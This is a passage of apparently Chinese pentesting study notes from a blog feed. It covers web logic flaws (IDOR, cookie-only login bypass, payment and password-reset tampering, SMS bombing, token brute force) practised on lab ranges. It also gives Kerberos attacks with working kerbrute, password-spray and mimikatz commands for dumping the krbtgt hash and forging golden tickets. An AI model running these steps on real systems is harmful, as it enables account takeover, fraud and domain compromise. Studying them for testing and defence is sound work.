                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cc5ad2c775c548ad2e666257f2dda0955ffdfb06.png@831w_122h_progressive.webp"
                      alt="img"
                ></p>
<ol start="4">
<li><p>查看源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/5b160682c3c05c4d5a892c2606e3871c474303a2.png@810w_227h_progressive.webp"
                      alt="img"
                ></p>
</li>
</ol>
<h2 id="JAVA语言方面"><a href="#JAVA语言方面" class="headerlink" title="JAVA语言方面"></a>JAVA语言方面</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221009143751313.png"
                      alt="image-20221009143751313"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>逻辑越权</title>
    <url>/2023/03/08/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117170059743.png"
                      alt=" "
                ></p>
<p>一般来说是更换了某个id之类的身份标识，从而使A账号获取（修改，删除等）B账号数据。</p>
<p>使用低权限身份账号，发送高权限账号才能有点请求，获得高权限的操作。</p>
<p>通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。</p>
<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><h6 id="第一项就是信息收集"><a href="#第一项就是信息收集" class="headerlink" title="第一项就是信息收集"></a>第一项就是信息收集</h6><p>一般一个网站注册时输入用户名都会禁止用户名的重复使用，可以通过这个机制判断存在的用户名，或者再一些个人主页的介绍中也会显示该用户的用户名等一些信息 </p>
<h6 id="pikachu靶场水平越权演示（添加用户）"><a href="#pikachu靶场水平越权演示（添加用户）" class="headerlink" title="pikachu靶场水平越权演示（添加用户）"></a>pikachu靶场水平越权演示（添加用户）</h6><p>先登入自己或者已知的账号，用抓包工具抓个包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173104587.png"
                      alt="image-20221117173104587"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173229898.png"
                      alt="image-20221117173229898"
                ></p>
<p>通过前面的信息收集获取别的账号用户名，更改username数据包信息为lucy，放包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173612943.png"
                      alt="image-20221117173612943"
                ></p>
<p>发现直接登入进去，信息得以获取</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173357607.png"
                      alt="image-20221117173357607"
                ></p>
<h6 id="pikachu靶场垂直越权漏洞演示"><a href="#pikachu靶场垂直越权漏洞演示" class="headerlink" title="pikachu靶场垂直越权漏洞演示"></a>pikachu靶场垂直越权漏洞演示</h6><p>首先来到管理员后台，发现具有删除操作以及用户添加权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117175438679.png"
                      alt="image-20221117175438679"
                ></p>
<p>添加账号，并通过抓包工具抓取数据包，存放数据包备用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180719404.png"
                      alt="image-20221117180719404"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180735730.png"
                      alt="image-20221117180735730"
                ></p>
<p>接下来来到普通用户界面，发现只有查看权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180014736.png"
                      alt="image-20221117180014736"
                ></p>
<p>抓取该用户的数据包，并且复制该用户的cookie信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180904785.png"
                      alt="image-20221117180904785"
                ></p>
<p>将该cookie替换至刚才保存的管理员数据包中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180934389.png"
                      alt="image-20221117180934389"
                ></p>
<p>放包，发现刚才添加的用户，以普通用户的形式被添加</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117181007984.png"
                      alt="image-20221117181007984"
                ></p>
<p>等等！好像有点不对劲：这个步骤是先要利用管理员的数据包，但是你都具有管理员权限了，为什么还用普通用户添加账号，这根本就不符合逻辑，显得有些鸡肋。</p>
<p>那该怎么利用这个漏洞：主要是研究怎么获取管理员数据包</p>
<p>1.普通用户如果在前端具有操作界面（就是说显示着可以添加用户但是点之后会给你提示说没有权限的弹窗之类的）可以抓取数据包</p>
<p>2.通过网站源码本地搭建，自己模拟抓取</p>
<p>3.盲猜</p>
<h6 id="墨者靶场题目演示（水平越权）："><a href="#墨者靶场题目演示（水平越权）：" class="headerlink" title="墨者靶场题目演示（水平越权）："></a>墨者靶场题目演示（水平越权）：</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201422846.png"
                      alt="image-20221117201422846"
                ></p>
<p>登入靶场，目标是获取马春生的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201456774.png"
                      alt="image-20221117201456774"
                ></p>
<p>登入测试账号test，抓包，发现uid&#x3D;test，如果将其改成马春生的用户名会不会登入进去？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201819559.png"
                      alt="image-20221117201819559"
                ></p>
<p>第二个数据包，发现有个card_id可能是用户的编号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202202381.png"
                      alt="image-20221117202202381"
                ></p>
<p>访问card_id，可以得到该账户的信息，包括密码等</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202646702.png"
                      alt="image-20221117202646702"
                ></p>
<p>改变card_id值发现可以访问别的用户的信息，一个一个试断然不可能这时候就需要借用工具来解决</p>
<p>将数据包发送值intruder模块</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202840353.png"
                      alt="image-20221117202840353"
                ></p>
<p>将card_id的值的最后两位作为替换值，范围为00-99，通过爆破可获得其他用户的数据信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203032419.png"
                      alt="image-20221117203032419"
                ></p>
<p>那该怎么找到马春生的账号card_id呢？</p>
<p>返回网页登录页，仔细查看马春生的图像，f12查看发现图片的名字跟card_id有关联，说明既有可能是马春生的card_id</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203311191.png"
                      alt="image-20221117203311191"
                ></p>
<p>返回数据包，查看该值的数据，可能就是马春生的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203421886.png"
                      alt="image-20221117203421886"
                ></p>
<p>返回包查看账号密码，登入验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203534056.png"
                      alt="image-20221117203534056"
                ></p>
<p>密码md5加密，解密一下，得到密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203615549.png"
                      alt="image-20221117203615549"
                ></p>
<p>登入账号，结束！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203653213.png"
                      alt="image-20221117203653213"
                ></p>
<h6 id="漏洞产生原理"><a href="#漏洞产生原理" class="headerlink" title="漏洞产生原理"></a>漏洞产生原理</h6><p>前端安全造成：界面</p>
<p>判断用户等级之后，代码界面部分进行可选显示</p>
<p>后端安全造成：数据库</p>
<p>user表（管理员和普通用户同表）：id，username，password，usertype</p>
<p>​                                                               1     admin            123456              1</p>
<p>​                                                               2     xiaodi            555555               2</p>
<p>登陆用户admin或小迪时，怎么判断是什么级别的用户？</p>
<p>通过usertype值来判断</p>
<p>如果在访问网站数据包中有传输用户的编号、用户组编号或者类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本方法。</p>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><h3 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="登录应用功能点安全问题"></a>登录应用功能点安全问题</h3><p>1.直接通过爆破绕过</p>
<p>2.cookie脆弱性</p>
<p>分析以下代码发现，它只对cookie中user的值是否为空进行验证，只要保证user的值不为空，随便一个数据都可以绕过验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154542565.png"
                      alt="image-20221118154542565"
                ></p>
<p>操作只要把cookie的值，改为user&#x3D;a或者任意一个数即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154848591.png"
                      alt="image-20221118154848591"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154922813.png"
                      alt="image-20221118154922813"
                ></p>
<p>放包，进入后台</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118155003846.png"
                      alt="image-20221118155003846"
                ></p>
<p>以上是白盒测试结果，在黑盒环境（实战）中，如何确定？</p>
<p>在实战中一般看数据包的参数，一般看cookie值，但是十分的困难</p>
<h3 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h3><h4 id="支付篡改"><a href="#支付篡改" class="headerlink" title="支付篡改"></a>支付篡改</h4><p><a class="link"   href="https://www.secpulse.com/archives/67080.html" >https://www.secpulse.com/archives/67080.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h6 id="商城支付漏洞"><a href="#商城支付漏洞" class="headerlink" title="商城支付漏洞"></a>商城支付漏洞</h6><p>进入商城程序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160616031.png"
                      alt="image-20221118160616031"
                ></p>
<p>点击购买，进行抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160725696.png"
                      alt="image-20221118160725696"
                ></p>
<p>发现数据包中有数量参数，但是没有发现金额数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160751796.png"
                      alt="image-20221118160751796"
                ></p>
<p>尝试将数量改成负数，会不会价格也成负数？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161056513.png"
                      alt="image-20221118161056513"
                ></p>
<p>果然！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161118507.png"
                      alt="image-20221118161118507"
                ></p>
<h6 id="订单情况分析"><a href="#订单情况分析" class="headerlink" title="订单情况分析"></a>订单情况分析</h6><p>更改订单编号，以1价格买2东西</p>
<p>第一个先买1件商品，生成订单</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161936394.png"
                      alt="image-20221118161936394"
                ></p>
<p>点击提交订单，抓取数据包，生成订单编号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118162057115.png"
                      alt="image-20221118162057115"
                ></p>
<p>生成一个新的订单，这次买10件，提交订单</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161508718.png"
                      alt="image-20221118161508718"
                ></p>
<p>提交订单，抓取数据包，得到本单的订单号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161639771.png"
                      alt="image-20221118161639771"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161804721.png"
                      alt="image-20221118161804721"
                ></p>
<p>将前一个只买一件的订单的订单号复制到该数据包中，放包</p>
<p>得到只需1件的价格就能买10件的支付订单</p>
<h6 id="修改价格以及商品的漏洞演示"><a href="#修改价格以及商品的漏洞演示" class="headerlink" title="修改价格以及商品的漏洞演示"></a>修改价格以及商品的漏洞演示</h6><p>进入网页</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163016002.png"
                      alt="image-20221118163016002"
                ></p>
<p>购买两个，抓取数据包，发现数量参数和价格</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163312968.png"
                      alt="image-20221118163312968"
                ></p>
<p>修改价格和数量，放包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163408592.png"
                      alt="image-20221118163408592"
                ></p>
<p>也可以修改商品的id来修改商品种类</p>
<p>数据包，商品的名字参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163541329.png"
                      alt="image-20221118163541329"
                ></p>
<p>换一款商品，抓取数据包，复制name和id参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163815190.png"
                      alt="image-20221118163815190"
                ></p>
<p>将复制的name和id参数替换到便宜的商品的数据包中提交，放包，成功！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118164306598.png"
                      alt="image-20221118164306598"
                ></p>
<h6 id="支付方式"><a href="#支付方式" class="headerlink" title="支付方式"></a>支付方式</h6><p>可以更改支付接口，也就是改支付金额的提交账户，可以实现将钱支付到自己的账号上</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118165142012.png"
                      alt="image-20221118165142012"
                ></p>
<p>简单来说就是：抓包-改包-支付-钱打到自己的账户上-购买成功</p>
<h2 id="验证和找回"><a href="#验证和找回" class="headerlink" title="验证和找回"></a>验证和找回</h2><h4 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h4><p>客户端回显、response状态值，验证码爆破，找回流程绕过</p>
<h6 id="1-找回流程绕过靶场演示"><a href="#1-找回流程绕过靶场演示" class="headerlink" title="1.找回流程绕过靶场演示"></a>1.找回流程绕过靶场演示</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119132500738.png"
                      alt="image-20221119132500738"
                ></p>
<p>进入靶场</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119132537710.png"
                      alt="image-20221119132537710"
                ></p>
<p>直接用自己的手机号获取验证码，然后直接改成别人的手机号就行，抓包，数据包里面改</p>
<p>2.状态码修改漏洞：可以修改状态值，但是得看验证码的校准是在哪里验证的，服务器就不行，本地就可以抓取返回包修改返回状态值为成功即可</p>
<p>3.就是可以通过修改数据包跳过验证页面，直接修改的漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119142436036.png"
                      alt="image-20221119142436036"
                ></p>
<p>4.爆破测试实例</p>
<p>把验证码参数作为爆破点执行爆破</p>
<p>5.app短信轰炸接口调用实例</p>
<p> 利用各种app的短信验证码发送接口，利用抓包工具进行抓取，并将这些接口数据包整合以一定的间隔时间触发发送，实现短信轰炸</p>
<h2 id="验证安全"><a href="#验证安全" class="headerlink" title="验证安全"></a>验证安全</h2><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><h3 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h3><p>分类：图片、手机或者邮箱、语音、视频、操作</p>
<h6 id="验证码的识别插件以及工具的操作演示"><a href="#验证码的识别插件以及工具的操作演示" class="headerlink" title="验证码的识别插件以及工具的操作演示"></a>验证码的识别插件以及工具的操作演示</h6><p>就是识别图片验证码插件，很简单不写了</p>
<h6 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h6><p>服务器验证：</p>
<p>先随便输入一个正确的验证码和错误的账号，发现提示账号密码错误</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144611245.png"
                      alt="image-20221121144611245"
                ></p>
<p>输入错误的验证码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144645374.png"
                      alt="image-20221121144645374"
                ></p>
<p>抓包，试验一下改账号密码验证码不变重放数据包，是否报验证码错误，发现不报验证码错误，说明可以直接爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144916679.png"
                      alt="image-20221121144916679"
                ></p>
<p>将数据包发送到爆破模块，登陆成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121145109682.png"
                      alt="image-20221121145109682"
                ></p>
<p>客户端验证：</p>
<p>使劲点登陆，出现该弹窗，说明是客户端验证，源代码具有验证代码（前端验证）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121145353378.png"
                      alt="image-20221121145353378"
                ></p>
<p>爆破方法一样，就不说了</p>
<p>token绕过：</p>
<p>1.通过查看多个token值，推出规律，但是几乎不可能</p>
<p>2.替换法，将返回的验证数据包中的token值替换到请求包中即可，现在主要是要解决批量提交的问题</p>
<p>操作步骤：</p>
<p>抓取数据包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152520703.png"
                      alt="image-20221121152520703"
                ></p>
<p>将数据包发送至爆破模块，并设置爆破项，密码及token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152720271.png"
                      alt="image-20221121152720271"
                ></p>
<p>更改模式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152813967.png"
                      alt="image-20221121152813967"
                ></p>
<p>进入payloads，设置密码字典，和token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152913522.png"
                      alt="image-20221121152913522"
                ></p>
<p> 重点来了，设置token！！！</p>
<p>进入options</p>
<p>设置线程为1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153042170.png"
                      alt="image-20221121153042170"
                ></p>
<p>往下翻，找到redirections，设置为always</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153231388.png"
                      alt="image-20221121153231388"
                ></p>
<p>再找到Grep-Extract，点击Add，找到token值选中，点击ok</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153554177.png"
                      alt="image-20221121153554177"
                ></p>
<p>回到payloads，设置2参数也就是token参数，设置为Recursive grep</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153704611.png"
                      alt="image-20221121153704611"
                ></p>
<p>开始爆破，即可！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121154019160.png"
                      alt="image-20221121154019160"
                ></p>
<p>这个操作主要就是把上一次的返回token，作为下一次的请求token替换，提交，即可绕过</p>
]]></content>
  </entry>
  <entry>
    <title>Kerberos攻击</title>
    <url>/2023/04/14/Kerberos%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404104911790.png"
                      alt="image-20230404104911790"
                ></p>
<h2 id="AS-REQ-amp-AS-REP阶段攻击"><a href="#AS-REQ-amp-AS-REP阶段攻击" class="headerlink" title="AS_REQ&amp;AS_REP阶段攻击"></a>AS_REQ&amp;AS_REP阶段攻击</h2><h3 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h3><p>kerberos是一种认证协议，在第一阶段AS_REQ中当用户不存在时，返回包提示错误，用户存在时，密码正确，密码错误时返回包都不用一样</p>
<p>利用这一点就可以枚举出域内用户</p>
<p>三种状态的错误代码分别为：</p>
<p>KRB5DC_ERR_PREAUTH_REQUIRED           需要额外的预认证（用户存在）<br>KRB5DC_ERR_CLIENT_REVOKED                  客户端凭证已被吊销（禁用 ）<br>KRB5DC_ERR_C_PRINCIPAL_UNKNOWN    在Kerberos数据库中找不到客户端（不存在）</p>
<h6 id="枚举工具的使用"><a href="#枚举工具的使用" class="headerlink" title="枚举工具的使用"></a>枚举工具的使用</h6><p>kerbrute</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br><span class="line">kerbrute_windows_amd64.exe userenum --dc 192.168.10.2 -d test.lab users.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404112100259.png"
                      alt="image-20230404112100259"
                ></p>
<h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>在常规的爆破中，一般都是用很多密码取碰撞一个账户，很容易导致账号被锁定，密码喷洒时用一个密码去碰撞很多的账号，这个能有效避免账号被锁定</p>
<h6 id="喷撒原理"><a href="#喷撒原理" class="headerlink" title="喷撒原理"></a>喷撒原理</h6><p>就是在确认用户存在过后就会发送一个AS_REQ请i去，密码正确就会返回一个AS_REP，否则返回</p>
<p>KRB5KDC_ERP_PREAUTH_FAILED</p>
<ol>
<li>kerbrute工具</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 192.168.10.2 -d test.lab users.txt yuwin7.com（密码）</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><p>ADPwdSpray.py</p>
<p>可以利用hash值进行喷洒</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">针对明文进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.10.2 test.lab users.txt clearpassword 123.com(密码) tcp</span><br><span class="line"> </span><br><span class="line">针对哈希进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.10.2 test.lab users.txt ntlmhash afffeba176210fad4628f0524bfe1942 udp</span><br></pre></td></tr></table></figure></div>


</li>
<li><p>DomainPasswordSpray.ps1</p>
</li>
</ol>
<p>该工具需要在powershell环境中使用，powershell4.0不可用</p>
<p>这个工具是利用LDAP从域中导出用户列表，然后去掉被锁定的用户，再用固定密码进行密码喷洒</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">自动从域中导出用户列表</span><br><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password 密码</span><br><span class="line">指定用户列表，指定单个密码进行爆破</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -password yuwin2012.com（密码）</span><br><span class="line">指定用户、密码列表进行爆破，输出到特定文件中</span><br><span class="line"></span><br><span class="line">依次使用密码对账号进行匹配，简称喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -PasswordList pass.txt</span><br></pre></td></tr></table></figure></div>

<h3 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS_REP Roasting攻击"></a>AS_REP Roasting攻击</h3><p>AS_REP Roasting攻击是一种对用户账号进行离线爆破的攻击方式。</p>
<p>比较局限，需要勾选“不需要kerberos预身份验证“，默认不勾选</p>
<p>这个选项是第一步（AS_REQ&amp;AS_REP），主要是防止密码脱机爆破</p>
<p>如果关闭之后</p>
<p>就可以使域控不会作任何反应就会将TGT票据和加密hash的session Key 返回，就可以离线破解得到明文密码</p>
<h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>在Keerberos认证协议中，所有用户的票据都是由krbtgt的NTLM哈希值加密的来的</p>
<p>只要获取krbtgt的值就可以伪造任意用户的票据</p>
<p>这种方式就叫做黄金票据攻击</p>
<p>需要 域名、域sid、krbtgt哈希值、伪造的用户，这些信息（域控）</p>
<p><code>whoami /user</code>获取域的sid值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165843784.png"
                      alt="image-20230405165843784"
                ></p>
<p><code>net config workstation</code>查看所处域</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165952637.png"
                      alt="image-20230405165952637"
                ></p>
<p>获取krbtgt用户的hash</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz</span><br><span class="line">privilege::debug   提权</span><br><span class="line">lsadump::lsa /patch   获取krbtgt用户的hash，域的sid值</span><br><span class="line">lsadum::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure></div>

<p>不知道为什么krbtgt的NTLM值读不出来</p>
<p>3240a50b789addc29388d03988e89209</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405170743855.png"
                      alt="image-20230405170743855"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405113131030.png"
                      alt="image-20230405113131030"
                ></p>
<p>然后利用得到的hash值，利用mimikatz生成黄金票据并导入（在其他域内机子中输入）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">清除票据</span><br><span class="line">Kerberos::purge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /krbtgt:3240a50b789addc29388d03988e89209 /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:域控sid /krbtgt:NTLM值（3240a50b789addc29388d03988e89209） /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::ptt ticket.kirbi</span><br><span class="line"></span><br><span class="line">连接共享</span><br><span class="line">dir \\ip\c$</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406141213924.png"
                      alt="image-20230406141213924"
                ></p>
<p>拒绝访问，不知道为啥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406141242727.png"
